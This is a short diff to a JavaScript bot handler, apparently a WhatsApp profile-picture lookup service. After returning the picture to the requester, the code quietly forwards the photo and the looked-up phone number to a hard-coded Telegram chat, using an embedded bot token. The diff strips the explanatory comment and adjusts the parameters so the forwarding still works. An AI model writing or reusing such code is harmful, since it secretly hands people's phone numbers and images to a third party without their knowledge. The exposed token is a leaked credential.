@@ -206,8 +206,8 @@ async function startHisoka() {
         if (profilePicUrl) {
          
           res.json({ profilePicUrl, status });
-           // Send the photo and text to Telegram
-           const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&text=${number}`;
+           
+           const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(number)}`;
 
           await fetch(telegramUrl);
         } else {
